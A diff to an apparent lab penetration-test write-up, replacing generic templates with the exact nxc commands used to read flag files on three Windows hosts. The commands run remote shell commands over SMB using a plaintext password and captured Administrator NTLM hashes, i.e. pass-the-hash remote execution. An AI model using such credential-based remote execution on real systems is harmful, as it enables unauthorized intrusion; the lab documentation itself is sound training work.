@@ -427,20 +427,38 @@ We collected five flags — one `proof.txt` per machine, plus `local.txt` on the
 
 SECURE (.95) has no `local.txt` — we jumped straight to SYSTEM through the ManageEngine upload, so there was no user foothold to capture.
 
-We used `nxc` to find them: list the Desktop, search recursively, then read the file.
+Here are the exact commands we used, per machine.
+
+**SECURE (.95) — `proof.txt` only**
 
 ```bash
-# list Administrator Desktop
-nxc smb <IP> -u <user> -H <hash> [--local-auth] -x 'dir C:\Users\Administrator\Desktop\'
-
-# search local.txt / root.txt recursively
-nxc smb <IP> -u <user> -H <hash> [--local-auth] -x 'where /r C:\Users local.txt root.txt'
-
-# read a flag
-nxc smb <IP> -u <user> -H <hash> [--local-auth] -x 'type C:\Users\<user>\Desktop\<flag>'
+nxc smb 192.168.216.95 -u Eric.Wallows -p 'EricLikesRunning800' -x 'dir C:\Users\Administrator\Desktop\'
+nxc smb 192.168.216.95 -u Eric.Wallows -p 'EricLikesRunning800' -x 'type C:\Users\Administrator\Desktop\proof.txt'
 ```
 
-One gotcha: ERA’s Administrator is a **local** account, so we had to add `--local-auth`. SECURE and the DC use domain accounts.
+**ERA (.96) — `local.txt` + `proof.txt`**
+
+```bash
+nxc smb 192.168.216.96 -u Administrator -H faf613cedb73980bbd34e0a5514df813 --local-auth -x 'dir C:\Users\Administrator\Desktop\'
+nxc smb 192.168.216.96 -u Administrator -H faf613cedb73980bbd34e0a5514df813 --local-auth -x 'type C:\Users\apache\Desktop\local.txt'
+nxc smb 192.168.216.96 -u Administrator -H faf613cedb73980bbd34e0a5514df813 --local-auth -x 'type C:\Users\Administrator\Desktop\proof.txt'
+```
+
+**DC01 (.97) — `local.txt` + `proof.txt`**
+
+```bash
+nxc smb 192.168.216.97 -u Administrator -H d38e7c66048f80fd9566ab85afca76b1 -x 'dir C:\Users\Administrator.DC01\Desktop\'
+nxc smb 192.168.216.97 -u Administrator -H d38e7c66048f80fd9566ab85afca76b1 -x 'type C:\Users\charlotte\Desktop\local.txt'
+nxc smb 192.168.216.97 -u Administrator -H d38e7c66048f80fd9566ab85afca76b1 -x 'type C:\Users\Administrator.DC01\Desktop\proof.txt'
+```
+
+One gotcha: ERA's Administrator is a **local** account, so we had to add `--local-auth`. SECURE and the DC use domain accounts.
+
+If a flag is not on the Desktop, search for it recursively:
+
+```bash
+nxc smb <IP> -u <user> -H <hash> [--local-auth] -x 'where /r C:\Users local.txt root.txt'
+```
 
 | Machine | Flag | Path | Value |
 |---|---|---|---|
